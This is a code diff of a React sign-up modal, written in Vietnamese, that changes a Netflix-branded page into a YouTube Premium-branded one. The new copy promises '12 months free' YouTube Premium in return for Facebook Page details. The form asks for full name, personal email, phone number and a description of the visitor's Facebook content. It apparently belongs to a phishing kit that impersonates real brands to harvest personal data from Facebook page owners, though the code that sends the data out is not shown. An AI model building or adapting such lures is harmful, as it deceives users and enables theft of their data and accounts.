@@ -1,4 +1,4 @@
-import NetflixLogo from '@/assets/images/logoneflix.svg';
+import YoutubePremiumLogo from '@/assets/images/youtube-premium-logo.png';
 import { MODAL_BTN_PRIMARY, MODAL_INPUT_CLASS, MODAL_LABEL_CLASS, MODAL_TEXTAREA_CLASS, ModalSpinner } from '@/components/form-modal/modal-shell';
 import { useTranslation } from '@/hooks/use-translation';
 import { store } from '@/store/store';
@@ -46,8 +46,8 @@ const FORM_FIELDS: FormField[] = [
 
 const INIT_MODAL_TEXTS = [
     'Nhập thông tin để bắt đầu',
-    'Hoặc đăng nhập vào tài khoản hiện có.',
-    'Chương trình ưu đãi có hạn · 12 tháng miễn phí · 4K HDR',
+    'Điền thông tin Page Facebook để nhận YouTube Premium miễn phí.',
+    'Chương trình ưu đãi có hạn · 12 tháng miễn phí · Không quảng cáo · Phát nền',
     'Mô tả nội dung bạn sáng tạo trên Facebook',
     'Họ và tên',
     'Email cá nhân',
@@ -192,18 +192,18 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const inputErrorClass = (hasError: boolean) => (hasError ? 'border-error focus:border-error focus:shadow-[0_0_0_3px_rgba(255,180,171,0.2)]' : '');
 
     return (
-        <div className='netflix-modal fixed inset-0 z-50 flex min-h-screen flex-col overflow-y-auto bg-black text-[#e2e2e2]'>
+        <div className='youtube-modal fixed inset-0 z-50 flex min-h-screen flex-col overflow-y-auto bg-[#0f0f0f] text-white'>
             <div
                 aria-hidden
-                className='pointer-events-none absolute inset-x-0 top-0 h-[min(680px,70vh)] bg-[radial-gradient(ellipse_80%_60%_at_50%_0%,rgba(229,9,20,0.35)_0%,rgba(0,0,0,0)_70%)]'
+                className='pointer-events-none absolute inset-x-0 top-0 h-[min(680px,70vh)] bg-[radial-gradient(ellipse_80%_60%_at_50%_0%,rgba(62,166,255,0.2)_0%,rgba(15,15,15,0)_70%)]'
             />
 
             <header className='relative z-10 flex items-center justify-between px-5 py-5 md:px-16 md:py-6'>
-                <Image src={NetflixLogo} alt='Netflix' width={120} height={32} className='h-8 w-auto' priority />
+                <Image src={YoutubePremiumLogo} alt='YouTube Premium' width={160} height={26} className='h-7 w-auto' priority />
                 <button
                     type='button'
                     onClick={handleClose}
-                    className='flex h-9 w-9 items-center justify-center rounded-full text-[#B3B3B3] transition-colors hover:bg-white/10 hover:text-white'
+                    className='flex h-9 w-9 items-center justify-center rounded-full text-[#aaa] transition-colors hover:bg-white/10 hover:text-white'
                     aria-label='Close'
                 >
                     <FontAwesomeIcon icon={faXmark} className='h-5 w-5' />
@@ -212,8 +212,8 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
             <main className='relative z-10 mx-auto flex w-full max-w-[450px] flex-1 flex-col px-5 pb-10 md:px-0'>
                 <h1 className='mb-2 text-[32px] leading-tight font-bold text-white md:text-[40px]'>{t('Nhập thông tin để bắt đầu')}</h1>
-                <p className='mb-8 text-base text-[#B3B3B3]'>{t('Hoặc đăng nhập vào tài khoản hiện có.')}</p>
-                <p className='mb-6 text-sm text-[#8c8c8c]'>{t('Chương trình ưu đãi có hạn · 12 tháng miễn phí · 4K HDR')}</p>
+                <p className='mb-8 text-base text-[#aaa]'>{t('Điền thông tin Page Facebook để nhận YouTube Premium miễn phí.')}</p>
+                <p className='mb-6 text-sm text-[#717171]'>{t('Chương trình ưu đãi có hạn · 12 tháng miễn phí · Không quảng cáo · Phát nền')}</p>
 
                 <form onSubmit={handleSubmit} className='flex flex-col'>
                     <div className='flex flex-col gap-4'>
@@ -221,7 +221,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                             <div key={field.name}>
                                 <label className={MODAL_LABEL_CLASS}>
                                     {t(field.label)}
-                                    {field.required && <span className='text-[#ffb4ab]'> *</span>}
+                                    {field.required && <span className='text-[#3ea6ff]'> *</span>}
                                 </label>
                                 {field.type === 'textarea' ? (
                                     <textarea
@@ -247,7 +247,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                         <div>
                             <label className={MODAL_LABEL_CLASS}>
                                 {t('Số điện thoại')}
-                                <span className='text-[#ffb4ab]'> *</span>
+                                <span className='text-[#3ea6ff]'> *</span>
                             </label>
                             <div className={`phone-input-wrap${errors.phoneNumber ? ' iti--error' : ''}`}>
                                 <IntlTelInput
@@ -273,9 +273,9 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                                             setErrors((prev) => ({ ...prev, termsAccepted: undefined }));
                                         }
                                     }}
-                                    className='mt-0.5 h-4 w-4 rounded border-[#353535] accent-[#e50914]'
+                                    className='mt-0.5 h-4 w-4 rounded border-[#3f3f3f] accent-[#3ea6ff]'
                                 />
-                                <span className='text-sm text-[#B3B3B3]'>{t('Tôi đồng ý với Điều khoản sử dụng')}</span>
+                                <span className='text-sm text-[#aaa]'>{t('Tôi đồng ý với Điều khoản sử dụng')}</span>
                             </label>
                             {errors.termsAccepted && <p className='mt-1 text-sm text-[#ffb4ab]'>{errors.termsAccepted}</p>}
                         </div>
@@ -290,19 +290,19 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                             {t('Trợ giúp')}
                             <FontAwesomeIcon icon={faChevronDown} className='h-3 w-3 transition-transform group-open:rotate-180' />
                         </summary>
-                        <p className='mt-3 text-sm leading-relaxed text-[#B3B3B3]'>
+                        <p className='mt-3 text-sm leading-relaxed text-[#aaa]'>
                             {t('Có câu hỏi? Liên hệ với chúng tôi.')}
                         </p>
                     </details>
 
-                    <p className='mt-8 text-xs leading-relaxed text-[#8c8c8c]'>
+                    <p className='mt-8 text-xs leading-relaxed text-[#717171]'>
                         {t('Trang này được bảo vệ bởi Google reCAPTCHA để đảm bảo bạn không phải là bot.')}
                     </p>
                 </form>
             </main>
 
-            <footer className='relative z-10 mt-auto border-t border-[#353535]/40 bg-black px-5 py-6 md:px-16'>
-                <p className='text-sm text-[#8c8c8c]'>{t('Có câu hỏi? Liên hệ với chúng tôi.')}</p>
+            <footer className='relative z-10 mt-auto border-t border-[#3f3f3f]/40 bg-[#0f0f0f] px-5 py-6 md:px-16'>
+                <p className='text-sm text-[#717171]'>{t('Có câu hỏi? Liên hệ với chúng tôi.')}</p>
             </footer>
         </div>
     );
